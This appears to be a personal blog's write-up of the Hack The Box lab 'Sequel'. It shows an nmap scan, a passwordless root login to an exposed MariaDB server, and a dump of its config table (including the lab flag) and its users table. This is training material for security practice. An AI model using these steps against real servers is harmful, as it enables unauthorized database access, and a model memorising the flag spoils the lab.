@@ -1,0 +1,271 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<title>HTB-Sequel | Yuchen&#39;s Tech blog</title>
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="generator" content="Hugo 0.104.0" />
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<meta name="keywords" content="MariaDB, weak password">
+<meta name="description" content="This box is about “MariaDB” and “weak password”.
+Scan ┌──(kali㉿kali)-[~/htb] └─$ nmap -sC -sV 10.129.217.175 Starting Nmap 7.92 ( https://nmap.org ) at …">
+<link rel="stylesheet" type="text/css" media="screen" href="/css/normalize.css" />
+<link rel="stylesheet" type="text/css" media="screen" href="/css/main.css" />
+<link rel="stylesheet" type="text/css" media="screen" href="/css/all.css" /><link rel="stylesheet" href="/css/katex.css" crossorigin="anonymous">
+<script defer src="/js/katex.js"  integrity="sha384-HELAAZU8xvHgfT/8z4Mhmu+E2z3oBrMEuywaMh/CEd5uTZIDSct7TEaX+S43+dOi" crossorigin="anonymous"></script>
+<script defer src="/js/auto-render.js" integrity="sha384-0QrOZ8WIARJUoT5pH7Iuzi7iq0mXUXLF9yj5ZvYxTkMRv1zcaPQiOQ9ksHYbKw7M" crossorigin="anonymous" onload="renderMathInElement(document.body);"></script>
+<script>
+document.addEventListener("DOMContentLoaded", function() { renderMathInElement(document.body, { delimiters: [ {left: "$$", right: "$$", display: true}, {left: "$", right: "$", display: false} ] }); });
+</script>
+
+
+
+
+<meta property="og:title" content="HTB-Sequel" />
+<meta property="og:description" content="This box is about &ldquo;MariaDB&rdquo; and &ldquo;weak password&rdquo;.
+Scan ┌──(kali㉿kali)-[~/htb] └─$ nmap -sC -sV 10.129.217.175 Starting Nmap 7.92 ( https://nmap.org ) at 2022-05-31 14:47 EDT Nmap scan report for 10.129.217.175 Host is up (0.019s latency). Not shown: 999 closed tcp ports (conn-refused) PORT STATE SERVICE VERSION 3306/tcp open mysql? |_ssl-date: ERROR: Script execution failed (use -d to debug) |_tls-alpn: ERROR: Script execution failed (use -d to debug) |_sslv2: ERROR: Script execution failed (use -d to debug) | mysql-info: | Protocol: 10 | Version: 5." />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://ych3r.github.io/post/htb-sequel/" /><meta property="article:section" content="post" />
+<meta property="article:published_time" content="2022-05-31T15:08:13-04:00" />
+<meta property="article:modified_time" content="2022-05-31T15:08:13-04:00" />
+
+<meta name="twitter:card" content="summary"/>
+<meta name="twitter:title" content="HTB-Sequel"/>
+<meta name="twitter:description" content="This box is about &ldquo;MariaDB&rdquo; and &ldquo;weak password&rdquo;.
+Scan ┌──(kali㉿kali)-[~/htb] └─$ nmap -sC -sV 10.129.217.175 Starting Nmap 7.92 ( https://nmap.org ) at 2022-05-31 14:47 EDT Nmap scan report for 10.129.217.175 Host is up (0.019s latency). Not shown: 999 closed tcp ports (conn-refused) PORT STATE SERVICE VERSION 3306/tcp open mysql? |_ssl-date: ERROR: Script execution failed (use -d to debug) |_tls-alpn: ERROR: Script execution failed (use -d to debug) |_sslv2: ERROR: Script execution failed (use -d to debug) | mysql-info: | Protocol: 10 | Version: 5."/>
+
+<meta itemprop="name" content="HTB-Sequel">
+<meta itemprop="description" content="This box is about &ldquo;MariaDB&rdquo; and &ldquo;weak password&rdquo;.
+Scan ┌──(kali㉿kali)-[~/htb] └─$ nmap -sC -sV 10.129.217.175 Starting Nmap 7.92 ( https://nmap.org ) at 2022-05-31 14:47 EDT Nmap scan report for 10.129.217.175 Host is up (0.019s latency). Not shown: 999 closed tcp ports (conn-refused) PORT STATE SERVICE VERSION 3306/tcp open mysql? |_ssl-date: ERROR: Script execution failed (use -d to debug) |_tls-alpn: ERROR: Script execution failed (use -d to debug) |_sslv2: ERROR: Script execution failed (use -d to debug) | mysql-info: | Protocol: 10 | Version: 5."><meta itemprop="datePublished" content="2022-05-31T15:08:13-04:00" />
+<meta itemprop="dateModified" content="2022-05-31T15:08:13-04:00" />
+<meta itemprop="wordCount" content="656">
+<meta itemprop="keywords" content="MariaDB,weak password," />
+</head>
+<body>
+<header>
+<div id="avatar">
+<a href="https://ych3r.github.io/"><img src="/img/coder.png" alt="Yuchen&#39;s Tech blog"></a>
+</div>
+<div id="titletext">
+<h2 id="title"><a href="https://ych3r.github.io/">Yuchen&#39;s Tech blog</a></h2>
+</div>
+<div id="title-description">
+<p id="subtitle">Let&rsquo;s learn something new!</p>
+<div id="social">
+<nav><ul>
+<li><a href="https://github.com/ych3r"><i title="Github" class="icons fab fa-github"></i></a></li>
+<li><a><i title="Switch Dark Mode" class="dark-mode icons fas fa-moon"></i></a></li>
+</ul></nav>
+</div>
+</div>
+<div id="mainmenu">
+<nav>
+<ul>
+<li><a href="/">Home</a></li>
+<li><a href="/post">All Posts</a></li>
+<li><a href="/about">About</a></li>
+<li><a href="/tags">Tags</a></li>
+<li><a href="/categories">Categories</a></li>
+</ul>
+</nav>
+</div>
+</header>
+<main>
+<div class="post">
+<article>
+<div class="post-header">
+<div class="meta">
+<div class="date">
+<span class="day">31</span>
+<span class="rest">May 2022</span>
+</div>
+</div>
+<div class="matter">
+<h1 class="title">HTB-Sequel</h1>
+<p class="post-meta">
+<span class="post-meta">
+
+&nbsp;<i class="fas fa-clock"></i>&nbsp;4&nbsp;minutes
+
+
+ 
+&nbsp;| &nbsp;
+
+<i class="fas fa-book"></i>&nbsp;656&nbsp;words
+
+
+
+
+</span>
+
+</p>
+</div>
+</div>
+<div class="markdown">
+<p>This box is about &ldquo;MariaDB&rdquo; and &ldquo;weak password&rdquo;.</p>
+<h3 id="scan">Scan</h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/htb<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─$ nmap -sC -sV 10.129.217.175
+</span></span><span style="display:flex;"><span>Starting Nmap 7.92 <span style="color:#f92672">(</span> https://nmap.org <span style="color:#f92672">)</span> at 2022-05-31 14:47 EDT
+</span></span><span style="display:flex;"><span>Nmap scan report <span style="color:#66d9ef">for</span> 10.129.217.175
+</span></span><span style="display:flex;"><span>Host is up <span style="color:#f92672">(</span>0.019s latency<span style="color:#f92672">)</span>.
+</span></span><span style="display:flex;"><span>Not shown: <span style="color:#ae81ff">999</span> closed tcp ports <span style="color:#f92672">(</span>conn-refused<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>PORT     STATE SERVICE VERSION
+</span></span><span style="display:flex;"><span>3306/tcp open  mysql?
+</span></span><span style="display:flex;"><span>|_ssl-date: ERROR: Script execution failed <span style="color:#f92672">(</span>use -d to debug<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>|_tls-alpn: ERROR: Script execution failed <span style="color:#f92672">(</span>use -d to debug<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>|_sslv2: ERROR: Script execution failed <span style="color:#f92672">(</span>use -d to debug<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>| mysql-info: 
+</span></span><span style="display:flex;"><span>|   Protocol: <span style="color:#ae81ff">10</span>
+</span></span><span style="display:flex;"><span>|   Version: 5.5.5-10.3.27-MariaDB-0+deb10u1
+</span></span><span style="display:flex;"><span>|   Thread ID: <span style="color:#ae81ff">66</span>
+</span></span><span style="display:flex;"><span>|   Capabilities flags: <span style="color:#ae81ff">63486</span>
+</span></span><span style="display:flex;"><span>|   Some Capabilities: IgnoreSpaceBeforeParenthesis, ConnectWithDatabase, 
+</span></span><span style="display:flex;"><span>InteractiveClient, ODBCClient, Speaks41ProtocolOld, IgnoreSigpipes, 
+</span></span><span style="display:flex;"><span>SupportsCompression, SupportsTransactions, SupportsLoadDataLocal, 
+</span></span><span style="display:flex;"><span>LongColumnFlag, Support41Auth, Speaks41ProtocolNew, FoundRows, 
+</span></span><span style="display:flex;"><span>DontAllowDatabaseTableColumn, SupportsAuthPlugins, 
+</span></span><span style="display:flex;"><span>SupportsMultipleResults, SupportsMultipleStatments
+</span></span><span style="display:flex;"><span>|   Status: Autocommit
+</span></span><span style="display:flex;"><span>|   Salt: AVj5e<span style="color:#f92672">}</span>edEjhJyF.T;gyJ
+</span></span><span style="display:flex;"><span>|_  Auth Plugin Name: mysql_native_password
+</span></span><span style="display:flex;"><span>|_tls-nextprotoneg: ERROR: Script execution failed <span style="color:#f92672">(</span>use -d to debug<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>|_ssl-cert: ERROR: Script execution failed <span style="color:#f92672">(</span>use -d to debug<span style="color:#f92672">)</span>
+</span></span></code></pre></div><h3 id="connect-to-mariadb">Connect to MariaDB</h3>
+<p>First of all, we need to install mysql or mariadb. <code>sudo apt install  mysql*</code>.</p>
+<p>Then we gonna use:</p>
+<ul>
+<li>-h: Connect to host.</li>
+<li>-u: User for log-in if not current user.</li>
+</ul>
+<p><a href="https://www.mysqltutorial.org/mysql-cheat-sheet.aspx" target="_blank">MySQL Cheatsheet</a></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>┌──(kali㉿kali)-[~/htb]
+</span></span><span style="display:flex;"><span>└─$ mysql -h 10.129.217.175 -u root
+</span></span><span style="display:flex;"><span>Welcome to the MariaDB monitor.  Commands end with ; or \g.
+</span></span><span style="display:flex;"><span>Your MariaDB connection id is 73
+</span></span><span style="display:flex;"><span>Server version: 10.3.27-MariaDB-0+deb10u1 Debian 10
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Type &#39;help;&#39; or &#39;\h&#39; for help. Type &#39;\c&#39; to clear the current input 
+</span></span><span style="display:flex;"><span>statement.
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>MariaDB [(none)]&gt; help
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>General information about MariaDB can be found at
+</span></span><span style="display:flex;"><span>http://mariadb.org
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>List of all client commands:
+</span></span><span style="display:flex;"><span>Note that all text commands must be first on line and end with &#39;;&#39;
+</span></span><span style="display:flex;"><span>?         (\?) Synonym for `help&#39;.
+</span></span><span style="display:flex;"><span>clear     (\c) Clear the current input statement.
+</span></span><span style="display:flex;"><span>connect   (\r) Reconnect to the server. Optional arguments are db and 
+</span></span><span style="display:flex;"><span>host.
+</span></span><span style="display:flex;"><span>delimiter (\d) Set statement delimiter.
+</span></span><span style="display:flex;"><span>edit      (\e) Edit command with $EDITOR.
+</span></span><span style="display:flex;"><span>ego       (\G) Send command to MariaDB server, display result vertically.
+</span></span><span style="display:flex;"><span>exit      (\q) Exit mysql. Same as quit.
+</span></span><span style="display:flex;"><span>go        (\g) Send command to MariaDB server.
+</span></span><span style="display:flex;"><span>help      (\h) Display this help.
+</span></span><span style="display:flex;"><span>nopager   (\n) Disable pager, print to stdout.
+</span></span><span style="display:flex;"><span>notee     (\t) Don&#39;t write into outfile.
+</span></span><span style="display:flex;"><span>pager     (\P) Set PAGER [to_pager]. Print the query results via PAGER.
+</span></span><span style="display:flex;"><span>print     (\p) Print current command.
+</span></span><span style="display:flex;"><span>prompt    (\R) Change your mysql prompt.
+</span></span><span style="display:flex;"><span>quit      (\q) Quit mysql.
+</span></span><span style="display:flex;"><span>rehash    (\#) Rebuild completion hash.
+</span></span><span style="display:flex;"><span>source    (\.) Execute an SQL script file. Takes a file name as an 
+</span></span><span style="display:flex;"><span>argument.
+</span></span><span style="display:flex;"><span>status    (\s) Get status information from the server.
+</span></span><span style="display:flex;"><span>system    (\!) Execute a system shell command.
+</span></span><span style="display:flex;"><span>tee       (\T) Set outfile [to_outfile]. Append everything into given 
+</span></span><span style="display:flex;"><span>outfile.
+</span></span><span style="display:flex;"><span>use       (\u) Use another database. Takes database name as argument.
+</span></span><span style="display:flex;"><span>charset   (\C) Switch to another charset. Might be needed for processing 
+</span></span><span style="display:flex;"><span>binlog with multi-byte charsets.
+</span></span><span style="display:flex;"><span>warnings  (\W) Show warnings after every statement.
+</span></span><span style="display:flex;"><span>nowarning (\w) Don&#39;t show warnings after every statement.
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>For server side help, type &#39;help contents&#39;
+</span></span></code></pre></div><h3 id="walk-around">Walk around</h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>MariaDB <span style="color:#f92672">[(</span>none<span style="color:#f92672">)]</span>&gt; show databases;
+</span></span><span style="display:flex;"><span>+--------------------+
+</span></span><span style="display:flex;"><span>| Database           |
+</span></span><span style="display:flex;"><span>+--------------------+
+</span></span><span style="display:flex;"><span>| htb                |
+</span></span><span style="display:flex;"><span>| information_schema |
+</span></span><span style="display:flex;"><span>| mysql              |
+</span></span><span style="display:flex;"><span>| performance_schema |
+</span></span><span style="display:flex;"><span>+--------------------+
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">4</span> rows in set <span style="color:#f92672">(</span>0.019 sec<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>MariaDB <span style="color:#f92672">[(</span>none<span style="color:#f92672">)]</span>&gt; use htb;
+</span></span><span style="display:flex;"><span>Reading table information <span style="color:#66d9ef">for</span> completion of table and column names
+</span></span><span style="display:flex;"><span>You can turn off this feature to get a quicker startup with -A
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Database changed
+</span></span><span style="display:flex;"><span>MariaDB <span style="color:#f92672">[</span>htb<span style="color:#f92672">]</span>&gt; show tables;
+</span></span><span style="display:flex;"><span>+---------------+
+</span></span><span style="display:flex;"><span>| Tables_in_htb |
+</span></span><span style="display:flex;"><span>+---------------+
+</span></span><span style="display:flex;"><span>| config        |
+</span></span><span style="display:flex;"><span>| users         |
+</span></span><span style="display:flex;"><span>+---------------+
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">2</span> rows in set <span style="color:#f92672">(</span>0.021 sec<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>MariaDB <span style="color:#f92672">[</span>htb<span style="color:#f92672">]</span>&gt; <span style="color:#66d9ef">select</span> * from config;
+</span></span><span style="display:flex;"><span>+----+-----------------------+----------------------------------+
+</span></span><span style="display:flex;"><span>| id | name                  | value                            |
+</span></span><span style="display:flex;"><span>+----+-----------------------+----------------------------------+
+</span></span><span style="display:flex;"><span>|  <span style="color:#ae81ff">1</span> | timeout               | 60s                              |
+</span></span><span style="display:flex;"><span>|  <span style="color:#ae81ff">2</span> | security              | default                          |
+</span></span><span style="display:flex;"><span>|  <span style="color:#ae81ff">3</span> | auto_logon            | false                            |
+</span></span><span style="display:flex;"><span>|  <span style="color:#ae81ff">4</span> | max_size              | 2M                               |
+</span></span><span style="display:flex;"><span>|  <span style="color:#ae81ff">5</span> | flag                  | 7b4bec00d1a39e3dd4e021ec3d915da8 |
+</span></span><span style="display:flex;"><span>|  <span style="color:#ae81ff">6</span> | enable_uploads        | false                            |
+</span></span><span style="display:flex;"><span>|  <span style="color:#ae81ff">7</span> | authentication_method | radius                           |
+</span></span><span style="display:flex;"><span>+----+-----------------------+----------------------------------+
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">7</span> rows in set <span style="color:#f92672">(</span>0.013 sec<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>MariaDB <span style="color:#f92672">[</span>htb<span style="color:#f92672">]</span>&gt; <span style="color:#66d9ef">select</span> * from users;
+</span></span><span style="display:flex;"><span>+----+----------+------------------+
+</span></span><span style="display:flex;"><span>| id | username | email            |
+</span></span><span style="display:flex;"><span>+----+----------+------------------+
+</span></span><span style="display:flex;"><span>|  <span style="color:#ae81ff">1</span> | admin    | admin@sequel.htb |
+</span></span><span style="display:flex;"><span>|  <span style="color:#ae81ff">2</span> | lara     | lara@sequel.htb  |
+</span></span><span style="display:flex;"><span>|  <span style="color:#ae81ff">3</span> | sam      | sam@sequel.htb   |
+</span></span><span style="display:flex;"><span>|  <span style="color:#ae81ff">4</span> | mary     | mary@sequel.htb  |
+</span></span><span style="display:flex;"><span>+----+----------+------------------+
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">4</span> rows in set <span style="color:#f92672">(</span>0.020 sec<span style="color:#f92672">)</span>
+</span></span></code></pre></div>
+</div>
+<div class="tags">
+<div class="taxosfloating_left">
+<p>Categories</p>
+</div>
+<div class="termsfloating_right">
+<p>
+<a href="/categories/writeups/">writeups</a>
+</p>
+</div>
+<div class="clearit"></div>
+<div class="tags">
+<div class="taxosfloating_left">
+<p>Tags</p>
+</div>
+<div class="termsfloating_right">
+<p>
+<a href="/tags/mariadb/">mariadb</a>
+<a href="/tags/weak-password/">weak-password</a>
+</p>
+</div>
+<div class="clearit"></div>
+</div>
+</article>
+</div>
+</main>
+<footer>
+© Yuchen Liu 2022
+</footer><script src="/js/dark-mode.js"></script>
+
+</body>
+</html>
